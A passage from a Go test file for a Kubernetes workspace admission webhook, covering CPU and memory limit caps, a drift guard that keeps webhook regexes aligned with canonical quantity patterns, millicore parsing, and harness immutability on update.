		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed, "%v", resp.Result)
	})
}

func TestUS243_WebhookCapsApplyToLimitFields(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
		MaxCPUMillicores:       4000,
		MaxMemoryMi:            8192,
	}
	t.Run("cpuLimit over cap rejected", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{CPU: "500m", CPULimit: "8000m"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed)
		assert.Contains(t, resp.Result.Message, "cpuLimit")
	})
	t.Run("memoryLimit over cap rejected", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{Memory: "512Mi", MemoryLimit: "16Gi"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed)
		assert.Contains(t, resp.Result.Message, "memoryLimit")
	})
	t.Run("cpuLimit at cap allowed", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{CPU: "500m", CPULimit: "4000m"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed, "%v", resp.Result)
	})
	t.Run("memoryLimit at cap allowed", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{Memory: "512Mi", MemoryLimit: "8192Mi"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed, "%v", resp.Result)
	})
}

// =============================================================================
// Drift guard: webhook regex MUST accept the same set of inputs as
// the canonical patterns in pkg/settings/quantity_patterns.go.
// =============================================================================
//
// The original "8gi" production bug was caused by the schema and the
// webhook drifting apart: schema had no pattern, webhook had a strict
// one. Now they both reference the same canonical pattern from
// pkg/settings, but the webhook's regex variables additionally have
// capture groups for parsing. This test verifies the accept-set is
// identical despite the parser-side decoration.
//
// If anyone changes either side without updating the other, this
// fires.

func TestWebhookRegexAcceptsSameInputsAsSettingsPattern(t *testing.T) {
	matrix := []struct {
		name     string
		webhook  *regexp.Regexp
		settings string
		probes   []string
	}{
		{
			name:     "memory",
			webhook:  memoryPattern,
			settings: settings.MemoryQuantityPattern,
			probes: []string{
				"1Gi", "8Gi", "512Mi", "1024Ki", "16Gi", "1Mi", // valid
				"0Gi", "0Mi", "0Ki", // zero-magnitude — both must reject
				"8gi", "8GB", "banana", "", "-1Gi", "8.5Gi", "8 Gi", "00Gi", // invalid
			},
		},
		{
			name:     "storage",
			webhook:  storageSizePattern,
			settings: settings.StorageQuantityPattern,
			probes: []string{
				"1Gi", "15Gi", "1024Mi", // valid
				"0Gi", "0Mi", // zero — both must reject
				"15gi", "15GB", "15Ti", "banana", "", "-1Gi", // invalid
			},
		},
		{
			name:     "cpu",
			webhook:  cpuPattern,
			settings: settings.CPUQuantityPattern,
			probes: []string{
				"500m", "1000m", "1.0", "0.5", "16.0", "1m", "0.001", // valid (positive)
				"0m", "0.0", "0.00", "0", // zero-magnitude — both must reject
				"banana", "1 core", "1000M", "", "-500m", // invalid
			},
		},
	}

	for _, c := range matrix {
		settingsRe := regexp.MustCompile(c.settings)
		for _, in := range c.probes {
			webhookOK := c.webhook.MatchString(in)
			settingsOK := settingsRe.MatchString(in)
			if webhookOK != settingsOK {
				t.Errorf("%s drift on input %q: webhook accepts=%v, settings accepts=%v. "+
					"The webhook regex variable in workspace_webhook.go and the canonical "+
					"pattern in pkg/settings/quantity_patterns.go must accept identical inputs.",
					c.name, in, webhookOK, settingsOK)
			}
		}
	}
}

// Direct unit tests for parseCPUMillis. The regex drift-guard above
// proves the regex matches/rejects the right strings, but doesn't
// exercise the parser's millicore conversion. A regression in the
// decimal branch (e.g. dropping the w*1000 term, mis-handling the
// 0.X case introduced by this PR's pattern change) would not be
// caught at the regex level.
//
// Reviewer caught the gap on PR #283; addressed here.
func TestParseCPUMillis(t *testing.T) {
	cases := []struct {
		input string
		want  int64
		// wantErr: true if parseCPUMillis should return an error.
		// We assert err presence, not exact text — the regex hint
		// in the error message is verified by other tests.
		wantErr bool
	}{
		// Millicore form
		{"1m", 1, false},
		{"500m", 500, false},
		{"1000m", 1000, false},
		{"16000m", 16000, false},

		// Decimal whole-and-fractional
		{"1.0", 1000, false},
		{"1.5", 1500, false},
		{"16.0", 16000, false},
		{"0.5", 500, false},
		{"0.001", 1, false},
		{"0.999", 999, false},

		// Decimal pad/truncate: parser pads frac to 3 digits, then
		// truncates anything beyond. "1.5" → frac="500", "0.0001"
		// would be regex-accepted by the new pattern (0.0001 has a
		// nonzero digit) but parser truncates frac to "000" → 0.
		// The 0 result here is a known pre-existing parser limitation
		// independent of this PR's pattern change. We pin it so the
		// behavior doesn't drift silently.
		{"0.0001", 0, false},

		// Zero-magnitude (rejected by the new regex; parser never
		// reaches them, but if a future code path constructs one
		// directly the parser should still error).
		{"0m", -1, true},
		{"0.0", -1, true},
		{"0.00", -1, true},
		{"0", -1, true},
		{"0.", -1, true},

		// Malformed
		{"banana", -1, true},
		{"500", -1, true}, // missing m
		{"", -1, true},
		{"-500m", -1, true},
		{"1000M", -1, true}, // capital M
	}
	for _, c := range cases {
		got, err := parseCPUMillis(c.input)
		if c.wantErr {
			if err == nil {
				t.Errorf("parseCPUMillis(%q) = (%d, nil); want error", c.input, got)
			}
			continue
		}
		if err != nil {
			t.Errorf("parseCPUMillis(%q) errored: %v", c.input, err)
			continue
		}
		if got != c.want {
			t.Errorf("parseCPUMillis(%q) = %d; want %d", c.input, got, c.want)
		}
	}
}

// --- S5: spec.harness immutability (pi-scoping §6) --------------------------

// newHarnessValidator is the standard validator fixture for the harness
// immutability tests.
func newHarnessValidator(t *testing.T) *WorkspaceValidator {
	t.Helper()
	return &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
}

// TestS5Workspace_HarnessImmutableOnUpdate: switching the harness in
// place is denied — sessions, config, and PVC artifacts are
// harness-specific; switching requires recreating the Workspace. The
// empty value normalizes to opencode on BOTH sides (old="" and
// new="opencode" are the same harness — no false denial).
func TestS5Workspace_HarnessImmutableOnUpdate(t *testing.T) {
	v := newHarnessValidator(t)

	cases := []struct {
		name       string
		old, new   v1.HarnessType
		wantDenied bool
	}{
		{"pi to opencode", v1.HarnessPi, v1.HarnessOpencode, true},
		{"opencode to pi", v1.HarnessOpencode, v1.HarnessPi, true},
		{"unset to pi", "", v1.HarnessPi, true},
		{"pi to unset", v1.HarnessPi, "", true},
		{"pi unchanged", v1.HarnessPi, v1.HarnessPi, false},
		{"opencode unchanged", v1.HarnessOpencode, v1.HarnessOpencode, false},
		{"unset to opencode (same effective harness)", "", v1.HarnessOpencode, false},
		{"opencode to unset (same effective harness)", v1.HarnessOpencode, "", false},
		{"unset unchanged", "", "", false},
	}
	for _, tc := range cases {
		oldWs := minimalValidWorkspace()
		oldWs.Spec.Harness = tc.old
		newWs := oldWs.DeepCopy()
		newWs.Spec.Harness = tc.new

		resp := v.Handle(context.Background(), newWorkspaceUpdateRequest(t, oldWs, newWs))
		assert.Equal(t, tc.wantDenied, !resp.Allowed, "%s: allowed=%v", tc.name, resp.Allowed)
		if tc.wantDenied {
			require.NotNil(t, resp.Result)
			assert.Contains(t, resp.Result.Message, "spec.harness is immutable",
				"%s: the denial must name the field and the remedy", tc.name)
			assert.Contains(t, resp.Result.Message, "recreate",
				"%s: the denial must state switching requires recreate", tc.name)
		}
	}
}

// TestS5Workspace_HarnessSettableOnCreate: CREATE has no old object to
// compare — the CRD enum + default constrain the value at admission;
// both harnesses must be creatable (the coexistence acceptance).
func TestS5Workspace_HarnessSettableOnCreate(t *testing.T) {
	v := newHarnessValidator(t)

	for _, h := range []v1.HarnessType{"", v1.HarnessOpencode, v1.HarnessPi} {
		ws := minimalValidWorkspace()
		ws.Spec.Harness = h
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed, "harness=%q must be creatable: %v", h, resp.Result)
	}
}
